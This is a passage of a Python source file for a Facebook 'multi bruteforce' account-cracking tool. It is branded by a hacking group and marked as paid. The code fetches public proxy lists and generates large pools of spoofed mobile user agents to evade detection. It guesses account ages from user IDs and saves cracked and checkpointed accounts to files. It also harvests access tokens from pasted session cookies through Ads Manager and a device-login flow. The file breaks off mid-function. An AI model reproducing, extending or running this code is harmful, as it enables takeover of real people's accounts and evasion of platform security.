#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
dump = []
ualu,ualuh = [],[]
try:
        import rich
except ImportError:
        print('\t[*] INSTALLING MISSING MODULES')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('\t[*] INSTALLING MISSING MODULES')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('\t[*] INSTALLING MISSING MODULES')
	os.system('pip install requests && pip install mechanize ')
url_mb = "https://mbasic.facebook.com"
#SETTING[ USERAGENT SETTINGS]
pretty.install()
CON=sol()
kontol=[]
memekz=[]
memek=[]
tod=[]
redmi=[]
ugen2=[]
ugen=[]
uasm=[]
redmi=[]
uadarimu=[]
iphon=[]
dalvic=[]
usragent=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	#AS LOGO AS DARKEST OWL HACKERS
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mDARKIEST OWL HACKERS')
prox=open('.prox.txt','r').read().splitlines()
ugen =[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13; Nokia X20 Build/TKQ1.220807.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c='Android 13; Nokia X20 Build/'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ2A.230405.003.E1; wv)'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c='Android 13; Pixel 7 Pro Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13; SM-S916U Build/TP1A.220624.014; wv)'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c='Android 13; SM-S916U Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13; SM-S916U Build/TP1A.220624.014; wv)'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c='Android 13; SM-S916U Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.117'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='[FB_IAB/FB4A;FBAV/418.0.0.33.69;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)     

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13; SM-S916B Build/TP1A.220624.014; wv)'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c='Android 13; SM-S916B Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)        
        
ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
ugen=[
'Mozilla/5.0 (Linux; U; Android 10; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4213.131 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; Mi 9T Pro Build/HBQJ6VQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4565.137 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 4; RMX2030 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4576.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 5; RMX1827 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4290.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; Mi 9T Pro Build/ND51EIQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4511.73 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/F1GU8VQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4467.79 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; RMX2030 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4811.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Infinix-X552 Build/K321E4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4540.98 Mobile Safari/537.36 ',
'Mozilla/5.0 (Linux; U; Android 8; RMX3201 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4850.53 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; Mi 9T Pro Build/W6LRCHQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4766.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; Infinix-X552 Build/1OTKCO) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4509.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8; RMX2001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4796.117 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; ASUS_Z017DC Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; View2 Plus Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 ',
'Mozilla/5.0 (Linux; Android 13; SM-N770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A325F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; Infinix-X552 Build/KLU1LU) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4753.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4692.78 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; RMX2001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.4324.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; Infinix-X552 Build/2JTOMF) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4268.51 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Infinix-X552 Build/F3C9GT) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.4528.64 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; Mi 9T Pro Build/K0TDRVQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4769.109 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; RMX2030 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4408.81 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; Mi 9T Pro Build/DH9T8CQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4899.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/RG9UMVQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4830.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4480.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4671.124 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; Mi 9T Pro Build/I0PAZJQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4852.88 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4609.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; RMX2040 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4287.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
'Mozilla/5.0 (Linux; Android 10; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.54 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 8.1.0; itel A16 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Davik/2.1.0 (Linux; U; Android 4.3.2.0.0; SM-726 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=566,height=624};]',
'Davik/2.1.0 (Linux; U; Android 7.0.2.0.0; SM-874 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Kaios;FBBD/Kaios;FBDV/Kaios;FBSV/Kaios.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=551,height=1777};]',
'Davik/2.1.0 (Linux; U; Android 6.3.1.0.0; SM-787 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=851,height=914};]',
'Davik/2.1.0 (Linux; U; Android 4.4.1.0.0; SM-802 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=672,height=1295};]',
'Davik/2.1.0 (Linux; U; Android 10.1.3.0.0; SM-332 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=846,height=1031};]',
'Davik/2.1.0 (Linux; U; Android 9.2.0.0.0; SM-279 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Kaios;FBBD/Kaios;FBDV/Kaios;FBSV/Kaios.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=601,height=901};]',
'Davik/2.1.0 (Linux; U; Android 6.1.2.0.0; SM-550 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=882,height=1840};]',
'Davik/2.1.0 (Linux; U; Android 9.0.4.0.0; SM-253 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/infinix;FBBD/infinix;FBDV/infinix;FBSV/infinix.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=384,height=755};]',
'Davik/2.1.0 (Linux; U; Android 10.2.2.0.0; SM-262 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=659,height=1190};]',]




#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' # +
k = '\033[93m' #  +
h = '\x1b[1;92m' # m +
hh = '\033[32m' #  -
u = '\033[95m' # 
kk = '\033[33m' #  -
b = '\33[1;96m' #  -
p = '\x1b[0;34m' #  +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-TIME ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


#------------------[ MACHINE-SUPPORT ]---------------#
def rfn_23(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
	
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

#------------------[ LOGO- ]-----------------#
ip = requests.get("https://api.ipify.org").text
print(f'\33[1;32mWELCOME')
print(f'YOUR IP ADDRESS  : {ip}')
print(f'\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def logo():
    print("""\n
         \033[1;32m  ######   ######  ##    ##\033[1;32m  
         \033[1;32m ##    ## ##    ## ###   ##\033[1;32m  
         \033[1;97m ##       ##       ####  ## \033[1;97m 
         \033[1;97m  ######   ######  ## ## ##\033[1;97m      \033[1;32mNIG\033[1;97mER\033[1;32mIA
         \033[1;97m       ##       ## ##  ####\033[1;97m 
         \033[1;32m ##    ## ##    ## ##   ###\033[1;32m          
         \033[1;32m  ######   ######  ##    ## \x1b[1;91m          XD
\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;30m[]\33[mNAME   | \33[1;32m[MBF] MULTI BRUTEFORCE__
\33[1;30m[]\33[mTEAM   | \33[1;32mDARKEST OWL HACKING COMMUNITY [DOHC]__
\33[1;30m[]\33[mOWNER  | \33[1;32m[MICHAEL],,,[SHALOM],,,[OMOTOSHO]__
\33[1;30m[]\33[mSTATUS | \33[1;32mPAID [#]
\33[1;30m[]\33[mGITHUB | \33[1;33mDOHS darkestowlhackingsociety
\33[1;30m[]\33[mWHATSAPP | \33[1;32m+23477939396
\33[1;30m[]\33[mFACEBOOK | \33[1;32m[MICHAEL],[SHALOM],[OMOTOSHO]
\33[1;30m[]\33[mVERSION  | \33[1;34m1.0__
\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m""")

#--------------------[ LOGIN COOKIES PHASE 1- ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = 'PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()

def token1():
	try:
		ses = requests.Session()
		print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		cookie = input(f'\n[{k}+{x}] ENTER COOKIE : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print('\nLogin Successful, file saved in .token.txt & .cok.txt')
		menu(my_name,my_id)
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
		
def token1():
	try:
		ses = requests.Session()
		print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		cookie = input(f'\n[{k}+{x}] ENTER COOKIE : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		print('\nLogin Successful, file saved in .token.txt & .cok.txt')
		menu(my_name,my_id)
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
		

def login_lagi334():
	try:
		os.system('clear')
		logo()
		print('\033[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print('\033[1;32m FACEBOOK MBF NEEDS COKKIE')
		print('\033[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		your_cookies = input("\x1b[1;97m[\x1b[1;92m?\x1b[1;97m] ENTER COOKIE :\x1b[1;93m ")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'How do you want to login to Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
